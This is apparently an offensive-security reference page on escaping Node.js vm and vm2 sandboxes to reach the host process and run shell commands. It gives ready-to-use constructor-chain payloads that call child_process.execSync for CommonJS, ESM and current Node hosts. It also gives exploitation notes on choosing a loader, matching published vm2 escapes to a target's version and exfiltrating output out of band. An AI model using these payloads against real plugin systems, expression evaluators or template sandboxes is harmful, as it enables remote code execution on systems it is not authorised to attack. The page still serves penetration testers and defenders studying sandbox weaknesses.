---
title: "Node.js vm escape: breaking out of vm and vm2 to process and require"
description: "Escaping Node's vm/vm2 module isolation back to the host realm: constructor-chain breakouts to process.mainModule.require, and known vm2 sandbox-escape patterns."
keywords:
  - node vm escape
  - vm2
  - sandbox escape
  - constructor.constructor
  - process.mainModule
---

# Node.js vm escape

Node's built-in `vm` module runs code in a separate context but **explicitly does not provide a security boundary**; `vm2` was the community library that tried to be one. From a code primitive confined to a `vm`/`vm2` context (a plugin system, a formula/expression evaluator, an SSTI landing in a sandbox), the goal is to climb from a sandbox object back to the host realm's `process`, and from there to `require('child_process')`.

## The core move: constructor chain

Objects passed into the sandbox carry prototypes that lead back to the host's `Function` constructor, which compiles code in the host realm:

```js
// CommonJS host (process.mainModule is defined):
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
```

`constructor.constructor` is the `Function` constructor; `Function('return process')()` returns the host `process` object. Error objects, thrown values, and prototype methods are all usable starting points when direct object access is limited.

The loader step depends on how the host was started. `process.mainModule.require` only exists when the entry point is a **CommonJS** module; if the host runs as an ES module (a `.mjs` entry, or `"type":"module"`), `process.mainModule` is `undefined` and that payload throws after obtaining `process`. Use a loader that does not depend on it:

```js
// ESM / current Node (Node 22.3+): built-in module accessor
this.constructor.constructor('return process')().getBuiltinModule('child_process').execSync('id').toString()

// Any modern Node: dynamic import returns a promise
this.constructor.constructor('return process')().binding // (legacy, often restricted)
// or, awaited: (async()=>{return (await import('node:child_process')).execSync('id').toString()})()
```

`process.getBuiltinModule('child_process')` is the cleanest version-appropriate replacement; fall back to a dynamic `import('node:child_process')` where it is unavailable.

## vm2 specifics

Plain `vm` is trivial to escape (it was never a boundary). `vm2` actively proxied and froze host objects, so escapes targeted flaws in that proxying: reaching an un-proxied host object through an error stack, a `Proxy` trap, `Symbol`-based access, or a host function leaked into the sandbox, then using it to obtain the real `Function`/`process`. `vm2` has been retired by its maintainers in favor of `isolated-vm` precisely because these escapes kept recurring, so a target still running `vm2` is a strong candidate; match a published escape to its version.

## Exploitation notes

- Confirm which isolation is in use: bare `vm` (no boundary, the constructor chain works directly), `vm2` (needs a version-matched proxy-escape), or `isolated-vm` (a real V8-isolate boundary, out of scope for these tricks, pivot elsewhere).
- Choose the loader by host module system: `process.mainModule.require` for CommonJS, `process.getBuiltinModule(...)` or dynamic `import()` for ESM/current Node. A bare `require` is undefined in the host global scope a `Function` constructor runs in.
- For output, return the command result through the evaluated expression (`.toString()`), or use an OOB callback when the sink does not echo.

## Tools

- Hand-built constructor-chain payloads; published vm2 escape PoCs (version-matched).

## References

- Node.js docs: vm module (security caveat)
- vm2 advisories / isolated-vm project
